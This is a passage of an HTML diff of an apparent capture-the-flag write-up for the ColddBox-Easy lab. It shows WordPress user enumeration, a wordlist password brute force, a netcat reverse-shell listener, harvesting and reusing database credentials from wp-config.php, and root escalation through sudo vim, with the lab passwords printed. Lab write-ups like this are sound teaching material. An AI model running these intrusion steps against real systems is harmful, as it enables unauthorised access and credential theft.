+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Vulnerable Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No plugins Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Vulnerable Themes <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Checking Known Locations - Time: 00:00:05 &lt;<span class="o">======================================</span>&gt; <span class="o">(</span><span class="m">330</span> / 330<span class="o">)</span> 100.00% Time: 00:00:05
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking Theme Versions <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No themes Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Timthumbs <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Checking Known Locations - Time: 00:00:40 &lt;<span class="o">====================================</span>&gt; <span class="o">(</span><span class="m">2575</span> / 2575<span class="o">)</span> 100.00% Time: 00:00:40
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No Timthumbs Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Checking Config Backups - Time: 00:00:00 &lt;<span class="o">=========================================</span>&gt; <span class="o">(</span><span class="m">22</span> / 22<span class="o">)</span> 100.00% Time: 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No Config Backups Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating DB Exports <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Checking DB Exports - Time: 00:00:00 &lt;<span class="o">=============================================</span>&gt; <span class="o">(</span><span class="m">36</span> / 36<span class="o">)</span> 100.00% Time: 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No DB Exports Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Medias <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span> <span class="o">(</span>Permalink setting must be <span class="nb">set</span> to <span class="s2">&#34;Plain&#34;</span> <span class="k">for</span> those to be detected<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Brute Forcing Attachment IDs - Time: 00:00:02 &lt;<span class="o">==================================</span>&gt; <span class="o">(</span><span class="m">100</span> / 100<span class="o">)</span> 100.00% Time: 00:00:02
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No Medias Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Brute Forcing Author IDs - Time: 00:00:00 &lt;<span class="o">========================================</span>&gt; <span class="o">(</span><span class="m">10</span> / 10<span class="o">)</span> 100.00% Time: 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> the cold in person
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> c0ldd
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> hugo
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> philip
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> No WPVulnDB API Token given, as a result vulnerability data has not been output.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> You can get a free API token with <span class="m">50</span> daily requests by registering at https://wpscan.com/register
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Finished: Sun Jan <span class="m">10</span> 04:08:52 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Requests Done: <span class="m">3136</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Cached Requests: <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Sent: 781.452 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Received: 16.528 MB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Memory used: 238.738 MB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Elapsed time: 00:01:00
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Performed wpscan enumeration confirmed our previously found users and also found out of date theme called <strong>twentyfifteen</strong>.<br />
 Let&rsquo;s try to brute force their credentials.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">wpscan --url http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt
-. . .
-
-<span class="o">[</span>+<span class="o">]</span> Performing password attack on Wp Login against <span class="m">3</span> user/s
-<span class="o">[</span>SUCCESS<span class="o">]</span> - c0ldd / <span class="m">9876543210</span>
-. . .
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">. . .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Performing password attack on Wp Login against <span class="m">3</span> user/s
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SUCCESS<span class="o">]</span> - c0ldd / <span class="m">9876543210</span>
+</span></span><span class="line"><span class="cl">. . .
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="gaining-access">Gaining Access</h3>
 <p>We were able to brute force <strong>c0ldd</strong> credentials and now we can try to login via admin panel (/wp-admin)</p>
@@ -2282,7 +2280,7 @@ In my case I chose <strong>header.php</strong> so I need to browse to <br />
 To execute the code and spawn a shell as the user (www-data).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2293,31 +2291,31 @@ To execute the code and spawn a shell as the user (www-data).</p>
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lnvp <span class="m">1234</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.145.98<span class="o">]</span> <span class="m">55580</span>
-Linux ColddBox-Easy 4.4.0-186-generic <span class="c1">#216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
- 11:30:25 up <span class="m">39</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.02
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
-$ 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.145.98<span class="o">]</span> <span class="m">55580</span>
+</span></span><span class="line"><span class="cl">Linux ColddBox-Easy 4.4.0-186-generic <span class="c1">#216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 11:30:25 up <span class="m">39</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.02
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Upgrade and stabilize given shell with these commands:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-www-data@ColddBox-Easy:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-www-data@ColddBox-Easy:/$
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">www-data@ColddBox-Easy:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">www-data@ColddBox-Easy:/$
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>Ctrl + Z</strong> to background the shell<br />
 In our terminal type <strong>stty raw -echo; fg</strong><br />
@@ -2332,7 +2330,7 @@ This turns off our own terminal echo and gives us</p>
 <p>Navigating to /www/html/ and reading though different php files, <strong>wp-config.php</strong> gives us some useful informations.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2354,45 +2352,45 @@ This turns off our own terminal echo and gives us</p>
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">. . .
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database <span class="k">for</span> WordPress */
-define<span class="o">(</span><span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;colddbox&#39;</span><span class="o">)</span><span class="p">;</span>
-
-/** MySQL database username */
-define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;c0ldd&#39;</span><span class="o">)</span><span class="p">;</span>
-
-/** MySQL database password */
-define<span class="o">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;cybersecurity&#39;</span><span class="o">)</span><span class="p">;</span>
-
-/** MySQL hostname */
-define<span class="o">(</span><span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span><span class="o">)</span><span class="p">;</span>
-
-/** Database Charset to use in creating database tables. */
-define<span class="o">(</span><span class="s1">&#39;DB_CHARSET&#39;</span>, <span class="s1">&#39;utf8&#39;</span><span class="o">)</span><span class="p">;</span>
-
-/** The Database Collate type. Don<span class="s1">&#39;t change this if in doubt. */
-</span><span class="s1">define(&#39;</span>DB_COLLATE<span class="s1">&#39;, &#39;</span><span class="err">&#39;</span><span class="o">)</span><span class="p">;</span>
-. . .
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">. . .
+</span></span><span class="line"><span class="cl">// ** MySQL settings - You can get this info from your web host ** //
+</span></span><span class="line"><span class="cl">/** The name of the database <span class="k">for</span> WordPress */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;colddbox&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** MySQL database username */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;c0ldd&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** MySQL database password */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;cybersecurity&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** MySQL hostname */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database Charset to use in creating database tables. */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_CHARSET&#39;</span>, <span class="s1">&#39;utf8&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** The Database Collate type. Don<span class="s1">&#39;t change this if in doubt. */
+</span></span></span><span class="line"><span class="cl"><span class="s1">define(&#39;</span>DB_COLLATE<span class="s1">&#39;, &#39;</span><span class="err">&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">. . .
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>It looks like we found one of the users password for MySQL database.<br />
 Let&rsquo;s see if the user reuses his password.<br />
 Success!</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">c0ldd@ColddBox-Easy:/var/www/html$ id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>c0ldd<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>c0ldd<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>c0ldd<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c0ldd@ColddBox-Easy:/var/www/html$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>c0ldd<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>c0ldd<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>c0ldd<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="user-flag">User Flag</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2407,26 +2405,26 @@ Success!</p>
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">c0ldd@ColddBox-Easy:~$ ls -la
-total <span class="m">24</span>
-drwxr-xr-x <span class="m">3</span> c0ldd c0ldd <span class="m">4096</span> oct <span class="m">19</span> 18:51 .
-drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> sep <span class="m">24</span> 16:52 ..
--rw------- <span class="m">1</span> c0ldd c0ldd    <span class="m">0</span> oct <span class="m">19</span> 18:51 .bash_history
--rw-r--r-- <span class="m">1</span> c0ldd c0ldd  <span class="m">220</span> sep <span class="m">24</span> 16:52 .bash_logout
--rw-r--r-- <span class="m">1</span> c0ldd c0ldd    <span class="m">0</span> oct <span class="m">14</span> 13:28 .bashrc
-drwx------ <span class="m">2</span> c0ldd c0ldd <span class="m">4096</span> sep <span class="m">24</span> 16:53 .cache
--rw-r--r-- <span class="m">1</span> c0ldd c0ldd  <span class="m">655</span> sep <span class="m">24</span> 16:52 .profile
--rw-r--r-- <span class="m">1</span> c0ldd c0ldd    <span class="m">0</span> sep <span class="m">24</span> 16:53 .sudo_as_admin_successful
--rw-rw---- <span class="m">1</span> c0ldd c0ldd   <span class="m">53</span> sep <span class="m">24</span> 18:22 user.txt
-c0ldd@ColddBox-Easy:~$ cat user.txt <span class="p">|</span> wc -c
-<span class="m">53</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c0ldd@ColddBox-Easy:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">24</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> c0ldd c0ldd <span class="m">4096</span> oct <span class="m">19</span> 18:51 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> sep <span class="m">24</span> 16:52 ..
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> c0ldd c0ldd    <span class="m">0</span> oct <span class="m">19</span> 18:51 .bash_history
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> c0ldd c0ldd  <span class="m">220</span> sep <span class="m">24</span> 16:52 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> c0ldd c0ldd    <span class="m">0</span> oct <span class="m">14</span> 13:28 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> c0ldd c0ldd <span class="m">4096</span> sep <span class="m">24</span> 16:53 .cache
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> c0ldd c0ldd  <span class="m">655</span> sep <span class="m">24</span> 16:52 .profile
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> c0ldd c0ldd    <span class="m">0</span> sep <span class="m">24</span> 16:53 .sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">-rw-rw---- <span class="m">1</span> c0ldd c0ldd   <span class="m">53</span> sep <span class="m">24</span> 18:22 user.txt
+</span></span><span class="line"><span class="cl">c0ldd@ColddBox-Easy:~$ cat user.txt <span class="p">|</span> wc -c
+</span></span><span class="line"><span class="cl"><span class="m">53</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>With c0ldd&rsquo;s password we can check if he has any sudo privileges.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2438,37 +2436,37 @@ c0ldd@ColddBox-Easy:~$ cat user.txt <span class="p">|</span> wc -c
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
-<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> c0ldd: 
-Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
-    <span class="o">(</span>root<span class="o">)</span> /usr/bin/vim
-    <span class="o">(</span>root<span class="o">)</span> /bin/chmod
-    <span class="o">(</span>root<span class="o">)</span> /usr/bin/ftp
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> c0ldd: 
+</span></span><span class="line"><span class="cl">Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /usr/bin/vim
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /bin/chmod
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /usr/bin/ftp
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We will escalate privileges with text editor <strong>vim</strong> : <a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">c0ldd@ColddBox-Easy:~$ sudo vim -c <span class="s1">&#39;:!/bin/sh&#39;</span>
-
-<span class="c1"># id                               </span>
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c0ldd@ColddBox-Easy:~$ sudo vim -c <span class="s1">&#39;:!/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># id                               </span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="root-flag">Root Flag</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2484,21 +2482,21 @@ El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># cd /root</span>
-<span class="c1"># ls -la</span>
-total <span class="m">32</span>
-drwx------  <span class="m">4</span> root root <span class="m">4096</span> sep <span class="m">24</span> 18:52 .
-drwxr-xr-x <span class="m">23</span> root root <span class="m">4096</span> sep <span class="m">24</span> 16:47 ..
--rw-------  <span class="m">1</span> root root   <span class="m">10</span> oct <span class="m">19</span> 18:53 .bash_history
--rw-r--r--  <span class="m">1</span> root root    <span class="m">0</span> oct <span class="m">14</span> 13:28 .bashrc
-drwx------  <span class="m">2</span> root root <span class="m">4096</span> sep <span class="m">24</span> 18:52 .cache
--rw-------  <span class="m">1</span> root root  <span class="m">220</span> sep <span class="m">24</span> 17:02 .mysql_history
-drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> sep <span class="m">24</span> 16:54 .nano
--rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> ago <span class="m">17</span>  <span class="m">2015</span> .profile
--rw-r--r--  <span class="m">1</span> root root   <span class="m">49</span> sep <span class="m">24</span> 18:23 root.txt
-<span class="c1"># cat root.txt | wc -c</span>
-<span class="m">49</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># cd /root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls -la</span>
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">4</span> root root <span class="m">4096</span> sep <span class="m">24</span> 18:52 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">23</span> root root <span class="m">4096</span> sep <span class="m">24</span> 16:47 ..
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root   <span class="m">10</span> oct <span class="m">19</span> 18:53 .bash_history
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root    <span class="m">0</span> oct <span class="m">14</span> 13:28 .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> sep <span class="m">24</span> 18:52 .cache
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root  <span class="m">220</span> sep <span class="m">24</span> 17:02 .mysql_history
